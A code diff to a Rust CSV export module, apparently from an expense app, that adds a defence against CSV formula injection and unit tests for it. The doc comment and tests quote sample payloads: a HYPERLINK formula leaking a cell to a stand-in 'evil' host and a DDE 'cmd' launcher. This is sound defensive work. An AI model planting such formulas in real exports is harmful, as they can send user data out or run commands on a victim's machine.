@@ -29,8 +29,18 @@ fn rows(d: &Data, from: &str, to: &str) -> Vec<Value> {
     v
 }
 
+/// Security (CSV/formula injection): a text cell starting with = + - @ TAB or CR is
+/// run as a formula by Excel/LibreOffice/Sheets (e.g. a synced note
+/// `=HYPERLINK("http://evil/?"&A1)`). Such cells get a leading `'`; plain numbers
+/// like `-12.50` are left alone. `csvimport::parse` strips the `'` again.
+pub fn neutralize_formula(x: &str) -> std::borrow::Cow<'_, str> {
+    let risky = x.starts_with(['=', '+', '-', '@', '\t', '\r']) && x.trim().parse::<f64>().is_err();
+    if risky { format!("'{x}").into() } else { x.into() }
+}
+
 fn csv_field(x: &str) -> String {
-    if x.contains([',', '"', '\n', '\r']) { format!("\"{}\"", x.replace('"', "\"\"")) } else { x.to_string() }
+    let x = neutralize_formula(x);
+    if x.contains([',', '"', '\n', '\r']) { format!("\"{}\"", x.replace('"', "\"\"")) } else { x.into_owned() }
 }
 
 pub fn csv(d: &Data, from: &str, to: &str) -> Vec<u8> {
@@ -277,6 +287,16 @@ mod tests {
         assert_eq!(lines.len(), 1 + 4);
         assert!(lines[1].contains("\"Lunch, with \"\"Sam\"\"\""));
         assert!(lines[1].starts_with("2026-10-01,,expense,"));
+    }
+
+    #[test]
+    fn csv_cells_cannot_be_formulas() {
+        assert_eq!(csv_field("=HYPERLINK(\"http://x/?\"&A1)"), "\"'=HYPERLINK(\"\"http://x/?\"\"&A1)\"");
+        assert_eq!(csv_field("+1+cmd|' /C calc'!A0"), "'+1+cmd|' /C calc'!A0");
+        assert_eq!(csv_field("@SUM(A1)"), "'@SUM(A1)");
+        assert_eq!(csv_field("-coffee"), "'-coffee");
+        assert_eq!(csv_field("-12.50"), "-12.50");
+        assert_eq!(csv_field("Lunch"), "Lunch");
     }
 
     #[test]
